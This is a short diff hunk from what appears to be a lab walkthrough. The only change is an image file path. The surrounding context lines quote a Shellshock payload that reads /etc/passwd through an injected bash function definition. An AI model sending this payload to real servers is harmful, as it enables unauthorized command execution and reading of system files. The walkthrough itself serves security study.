@@ -300,7 +300,7 @@ We have already tried the first one, so lets try it again with the following pay
 
 > () { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd
 
-![](<../../.gitbook/assets/5 (4).JPG>)
+![](<../../.gitbook/assets/5 (5).JPG>)
 
 That worked, but why? Let's break it down:
 
